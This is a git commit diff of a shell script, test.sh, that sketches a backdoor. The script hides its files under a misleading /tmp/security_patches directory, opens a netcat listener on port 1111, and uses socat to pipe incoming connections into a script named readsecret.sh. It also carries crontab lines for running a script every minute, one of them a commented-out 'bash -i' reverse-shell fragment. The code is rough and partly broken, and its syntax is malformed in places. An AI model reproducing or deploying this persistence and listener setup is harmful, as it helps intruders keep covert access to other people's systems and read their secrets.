08d289895d5425b9c45d9d8b937b71ecf9b91a5e
Kevin Seon <apkpj@Kevins-MacBook-Pro.local>
2022-10-01 15:09:52 -0500

    added some structure to what the script is going to look like'

--- test.sh
+++ test.sh
@@ -1,11 +1,19 @@
-#! /bin/sh
+#! /bin/bash
 
 mkdir /tmp/security_patches > /dev/null
 cd /tmp/security_patches
 
-# either fetch the script of actual exploitation from somewhere or feed it in here ig maybe?
+# This is all after I go ahead and install nc with 'yum install nc'
 
-# and then have a cronjob running it every minute
+nc -l 1111 # maybe -ul if udp
+# This socat makes a tcp connection but also I think i can just nc like nc -l 1111 | ./readsecret.sh
+socat -u tcp-l: 1111, fork system: ./readsecret.sh
 
-chmod +x /tmp/security_patches/script.sh
-(crontab -l ; echo "01 * * * * /tmp/security_patches/script.sh" ) >> crontab -
+
+
+# (crontab -l ; echo "* * * * * bash -i &> " ) >> crontab -
+
+# How to use this script, 
+# This is all after I go ahead and install nc with 'yum install nc' and download socat
+# chmod +x /tmp/security_patches/script.sh
+# We can add this script to the crontab by appending * * * * * /dir/this_script 
